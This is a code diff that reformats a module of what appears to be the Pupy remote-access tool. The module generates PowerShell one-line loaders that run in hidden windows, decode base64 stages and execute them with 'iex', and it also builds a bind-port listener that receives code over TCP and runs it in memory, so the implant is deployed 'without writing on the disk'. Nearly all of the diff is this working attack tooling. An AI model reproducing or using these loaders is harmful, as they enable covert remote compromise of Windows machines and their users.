@@ -4,7 +4,6 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
-from pupylib.PupyOutput import List, Success, Warn, Error
 
 from base64 import b64encode
 from time import sleep
@@ -14,13 +13,19 @@ import pupygen
 import socket
 import errno
 
+from pupylib.PupyOutput import List, Success, Warn, Error
+
+
 CONNECTION_RETRY_SLEEP_TIME = 3
 
 if sys.version_info.major > 2:
     xrange = range
 
 
-def serve_ps1_payload(display, server, conf, link_ip=None, useTargetProxy=False, nothidden=False):
+def serve_ps1_payload(
+    display, server, conf, link_ip=None,
+        useTargetProxy=False, nothidden=False):
+
     if not server:
         display(Error('Oneliners only supported from pupysh'))
         return
@@ -32,14 +37,21 @@ def serve_ps1_payload(display, server, conf, link_ip=None, useTargetProxy=False,
     if link_ip is None:
         link_ip = server.address
 
-    stage_encoding = "$data='{0}';$code=[System.Text.Encoding]::UTF8.GetString("\
-      "[System.Convert]::FromBase64String($data));$data='';iex $code;"
+    stage_encoding = \
+        "$data='{0}';$code=[System.Text.Encoding]::UTF8.GetString(" \
+        "[System.Convert]::FromBase64String($data));$data='';iex $code;"
 
     payload_url_x86 = server.serve_content(
         stage_encoding.format(
-            b64encode(pupygen.generate_ps1(
-                display, conf, x86=True, as_str=True, debug=conf.get('debug', False)))),
-        alias='ps1 payload [x86]')
+            b64encode(
+                pupygen.generate_ps1(
+                    display, conf, x86=True, as_str=True,
+                    debug=conf.get('debug', False)
+                )
+            )
+        ),
+        alias='ps1 payload [x86]'
+    )
 
     payload_url_x64 = server.serve_content(
         stage_encoding.format(
@@ -100,37 +112,63 @@ def serve_ps1_payload(display, server, conf, link_ip=None, useTargetProxy=False,
         oneliner,
         encoded_oneliner
     ], caption=Success(
-        'Copy/paste one of these one-line loader to deploy pupy without writing on the disk:')))
+        'Copy/paste one of these one-line loader to deploy '
+        'pupy without writing on the disk:'))
+    )
 
     display(Warn(
         'Please note that even if the target\'s system uses a proxy, '
         'this previous powershell command will not use the '
-        'proxy for downloading pupy'))
+        'proxy for downloading pupy')
+    )
+
 
 def send_ps1_payload(display, conf, bind_port, target_ip, nothidden=False):
 
-    ps1_template = """$l=[System.Net.Sockets.TcpListener][BIND_PORT];$l.start();$c=$l.AcceptTcpClient();$t=$c.GetStream();
-    [byte[]]$b=0..4096|%{0};$t.Read($b, 0, 4);$c="";
-    if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){$t.Write([System.Text.Encoding]::UTF8.GetBytes("2"),0,1);}
-    else{$t.Write([System.Text.Encoding]::UTF8.GetBytes("1"),0,1);}
-    while(($i=$t.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$c=$c+$d; }
-    $t.Close();$l.stop();iex $c;
-    """
+    ps1_template = \
+        '$l=[System.Net.Sockets.TcpListener][BIND_PORT];' \
+        '$l.start();' \
+        '$c=$l.AcceptTcpClient();' \
+        '$t=$c.GetStream();' \
+        '[byte[]]$b=0..4096|%{0};' \
+        '$t.Read($b, 0, 4);' \
+        '$c="";' \
+        'if ($Env:PROCESSOR_ARCHITECTURE -eq \'AMD64\'){' \
+        '$t.Write([System.Text.Encoding]::UTF8.GetBytes("2"),0,1);' \
+        '} else {' \
+        '$t.Write([System.Text.Encoding]::UTF8.GetBytes("1"),0,1);' \
+        '}' \
+        'while(($i=$t.Read($b,0,$b.Length)) -ne 0) {' \
+        '$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(' \
+        '$b,0,$i);' \
+        '$c=$c+$d;' \
+        '}' \
+        '$t.Close();' \
+        '$l.stop();' \
+        'iex $c;'
 
-    main_ps1_template = """$c=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $c;"""
-    hidden               = '' if nothidden else '-w hidden '
-    launcher             = ps1_template.replace("[BIND_PORT]",bind_port)
-    launcher             = launcher.replace('\n','').replace('    ','')
-    basic_launcher       = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
-    oneliner             = basic_launcher.replace('[CMD]', '-c \"%s\"' % launcher)
-    encoded_oneliner     = basic_launcher.replace('[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))
+    main_ps1_template = \
+        '$c=[System.Text.Encoding]::UTF8.GetString(' \
+        '[System.Convert]::FromBase64String(\'{0}\'));' \
+        'iex $c;'
 
-    display(List([
+    hidden = '' if nothidden else '-w hidden '
+    launcher = ps1_template.replace("[BIND_PORT]", bind_port)
+    launcher = launcher.replace('\n', '').replace('    ', '')
+    basic_launcher = 'powershell.exe [HIDDEN]-noni -nop [CMD]'.replace(
+        '[HIDDEN]', hidden)
+    oneliner = basic_launcher.replace('[CMD]', '-c \"%s\"' % launcher)
+    encoded_oneliner = basic_launcher.replace(
+        '[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))
+
+    display(
+        List([
             oneliner,
             encoded_oneliner,
         ], caption=Success(
             'Copy/paste one of these one-line loader to '
-            'deploy pupy without writing on the disk')))
+            'deploy pupy without writing on the disk'))
+    )
 
     display(Success('Generating puppy dll. Be patient...'))
 
@@ -155,7 +193,7 @@ def send_ps1_payload(display, conf, bind_port, target_ip, nothidden=False):
         return
 
     s.settimeout(30)
-    s.sendall("\n")
+    s.sendall('\n')
 
     display(Success('Receiving target architecure...'))
 
@@ -171,8 +209,13 @@ def send_ps1_payload(display, conf, bind_port, target_ip, nothidden=False):
         output_x86 = pupygen.generate_ps1(display, conf, x86=True, as_str=True)
         ps1_encoded = main_ps1_template.format(b64encode(output_x86))
 
-    display(Success('Sending ps1 payload to {0}:{1}'.format(target_ip, bind_port)))
+    display(
+        Success('Sending ps1 payload to {0}:{1}'.format(target_ip, bind_port))
+    )
     s.sendall(ps1_encoded)
     s.close()
 
-    display(Success('ps1 payload sent to target {0}:{1}'.format(target_ip, bind_port)))
+    display(
+        Success('ps1 payload sent to target {0}:{1}'.format(
+            target_ip, bind_port))
+    )
